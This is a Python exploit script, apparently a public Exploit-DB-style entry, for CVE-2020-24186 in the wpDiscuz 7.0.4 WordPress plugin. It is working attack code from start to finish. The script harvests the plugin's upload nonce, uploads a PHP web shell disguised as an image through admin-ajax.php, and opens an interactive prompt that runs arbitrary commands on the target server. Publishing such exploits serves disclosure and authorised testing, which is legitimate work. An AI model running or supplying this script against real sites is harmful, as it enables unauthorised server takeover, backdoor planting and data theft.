# Exploit Title: WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)
# Date: 2021/06/08
# Exploit Author: Fellipe Oliveira
# Vendor Homepage: https://gvectors.com/
# Software Link: https://downloads.wordpress.org/plugin/wpdiscuz.7.0.4.zip
# Version: wpDiscuz 7.0.4
# Tested on: Debian9, Windows 7, Windows 10 (Wordpress 5.7.2)
# CVE : CVE-2020-24186
# Thanks for the great contribution to the code: Z3roC00l (https://twitter.com/zeroc00I)

#!/bin/python3

import requests
import optparse
import re
import random
import time
import string
import json

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target host: http://192.168.1.81/blog")
parser.add_option('-p', '--path', action="store", dest="path", help="Path to exploitation: /2021/06/blogpost")


options, args = parser.parse_args()

if not options.url or not options.path:
    print('[+] Specify an url target')
    print('[+] Example usage: exploit.py -u http://192.168.1.81/blog -p /wordpress/2021/06/blogpost')
    print('[+] Example help usage: exploit.py -h')
    exit()

session = requests.Session()

main_url = options.url
path = options.path
url_blog = main_url + path
clean_host = main_url.replace('http://', '').replace('/wordpress','')

def banner():
    print('---------------------------------------------------------------')
    print('[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution')
    print('[-] File Upload Bypass Vulnerability - PHP Webshell Upload')
    print('[-] CVE: CVE-2020-24186')
    print('[-] https://github.com/hevox')
    print('--------------------------------------------------------------- \n')

def csrfRequest():
    global wmuSec
    global wc_post_id

    try:
        get_html = session.get(url_blog)
        response_len = str(len(get_html.text))
        response_code = str(get_html.status_code)
        print('[+] Response length:['+response_len+'] | code:['+response_code+']')

        raw_wmu = get_html.text.replace(',','\n')
        wmuSec = re.findall('wmuSecurity.*$',raw_wmu,re.MULTILINE)[0].split('"')[2]
        print('[!] Got wmuSecurity value: '+ wmuSec +'')
        raw_postID = get_html.text.replace(',','\n')
        wc_post_id = re.findall('wc_post_id.*$',raw_postID,re.MULTILINE)[0].split('"')[2]
        print('[!] Got wmuSecurity value: '+ wc_post_id +' \n')

    except requests.exceptions.ConnectionError as err:
        print('\n[x] Failed to Connect in: '+url_blog+' ')
        print('[x] This host seems to be Down')
        exit()


def nameRandom():
    global shell_name
    print('[+] Generating random name for Webshell...')
    shell_name = ''.join((random.choice(string.ascii_lowercase) for x in range(15)))
    time.sleep(1)
    print('[!] Generated webshell name: '+shell_name+'\n')

    return shell_name


def shell_upload():
    global shell
    print('[!] Trying to Upload Webshell..')
    try:
        upload_url = main_url + "/wp-admin/admin-ajax.php"
        upload_cookies = {"wordpress_test_cookie": "WP%20Cookie%20check", "wpdiscuz_hide_bubble_hint": "1"}
        upload_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "*/*", "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------2032192841253859011643762941", "Origin": "http://"+clean_host+"", "Connection": "close", "Referer": url_blog}
        upload_data = "-----------------------------2032192841253859011643762941\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nwmuUploadFiles\r\n-----------------------------2032192841253859011643762941\r\nContent-Disposition: form-data; name=\"wmu_nonce\"\r\n\r\n"+wmuSec+"\r\n-----------------------------2032192841253859011643762941\r\nContent-Disposition: form-data; name=\"wmuAttachmentsData\"\r\n\r\n\r\n-----------------------------2032192841253859011643762941\r\nContent-Disposition: form-data; name=\"wmu_files[0]\"; filename=\""+shell_name+".php\"\r\nContent-Type: image/png\r\n\r\nGIF689a;\r\n\r\n<?php system($_GET['cmd']); ?>\r\n\x1a\x82\r\n-----------------------------2032192841253859011643762941\r\nContent-Disposition: form-data; name=\"postId\"\r\n\r\n"+wc_post_id+"\r\n-----------------------------2032192841253859011643762941--\r\n"
        check = session.post(upload_url, headers=upload_headers, cookies=upload_cookies, data=upload_data)
        json_object = (json.loads(check.text))
        status = (json_object["success"])

        get_path = (check.text.replace(',','\n'))
        shell_pret = re.findall('url.*$',get_path,re.MULTILINE)
        find_shell = str(shell_pret)
        raw = (find_shell.replace('\\','').replace('url":"','').replace('\',','').replace('"','').replace('[\'',''))
        shell = (raw.split(" ",1)[0])

        if status == True:
            print('[+] Upload Success... Webshell path:' +shell+' \n')
        else:
            print('[x] Failed to Upload Webshell in: '+ url_blog +' ')
            exit()

    except requests.exceptions.HTTPError as conn:
        print('[x] Failed to Upload Webshell in: '+ url_blog +' ')

    return shell


def code_exec():
    try:
            while True:
                cmd = input('> ')
                codex = session.get(shell + '?cmd='+cmd+'')
                print(codex.text.replace('GIF689a;','').replace('�',''))
    except:
        print('\n[x] Failed to execute PHP code...')


banner()
csrfRequest()
nameRandom()
shell_upload()
code_exec()